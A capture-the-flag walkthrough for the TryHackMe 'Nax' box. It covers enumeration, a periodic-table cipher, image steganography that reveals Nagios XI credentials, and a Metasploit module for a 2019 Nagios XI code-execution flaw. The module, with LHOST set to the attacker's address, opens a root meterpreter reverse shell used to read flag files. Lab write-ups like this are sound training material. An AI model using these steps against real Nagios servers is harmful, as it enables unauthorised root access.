Nax is a medium difficulty box on [TryHackMe](https://www.tryhackme.com). Below is a step by step walkthrough to root this box.



Let's start by running **nmap -A [machine ip]**. We end up with the following results.

It looks like there's sites running both on http and https, let's take a look at both of them to see what's going on. Both sites show the same page as shown below.

However, a review of the source code reveals a comment with a possible subdirectory to look at.

Let's visit **http://[machine ip]/nagiosxi**. This leads to a login page for Nagios XI.

At this point, we do not have any credentials, so let's use gobuster to try to enumerate and try to find some files/other directories. Let's run **gobuster dir -u http://[machine ip]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,xls -t 50**. Unfortunately, this did not turn up anything. At this point I turned my attention back to the list of elements on the main page.

After a quick Google search, I found a [Periodic Table Cipher](https://www.dcode.fr/atomic-number-substitution). Converting the periodic elements (Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr) to their respective element numbers gives us **47 80 73 51 84 46 80 78 103 **.

Next, let's convert these numbers to their respective entries on an ASCII table. I used [RapidTables](https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html) for this. This gets us the answer to **Question 1**.

Visiting the answer to Question 1 gets us an image that I saved and downloaded.

Running **exiftool [image name]** (redacted due to it answering Question 1) gives us the answer to **Question 2**.

At this point, it seemed pretty obvious that this was using some sort of steganography, but I wasn't sure what type was being used to be honest. I searched for the answer to Question 2 in Google followed by the word cryptography, which led me to a Reddit thread which had a link to an online decoder. I imported the picture and it was able to find a payload hidden within the image.

This ends up providing you with the Nagios credentials, which end up being the answers to **Question 3** and **Question 4**. At this point, I went and attempted to use these newfound credentials to login to Nagios at **http://[machine ip]/nagiosxi/** I was able to login successfully.

The next question asked for the CVE number, so I Googled **CVE Nagios XI 5.5.6**. There were several vulnerabilities out there, but the CVE ended up being one from 2019 that allows code execution as root. This is the answer to **Question 5**.

**Question 6** has no answer to submit, as it wants you to start MetaSploit, so go ahead and do so.

**Question 7** asks you for the module name of the machine, using **search Nagios 5.5.6** once logged into will provide you with some modules, one of which is the answer to this question.

Once you have select this module, use **SET PASSWORD** and set the appropriate password and **SET LHOST [attacker ip address]**. Once done, it should look similar to the following.

Once reviewed, type **run** to run the exploit. You should have a meterpreter shell within a few moments. Next, type **shell** to get a local shell and run **whoami** and you will see you are root.

I next ran **ls /home** to enumerate nonroot users to find the user flag. There is a user **galand** here. If we run **ls /home/galand** we will see the user.txt file. This can be read with **cat /home/galand/user.txt**, the answer to **Question 8**.

Next, let's run **cat /root/root.txt**, which is the usual default location for root flags.

And we're all done with this box.
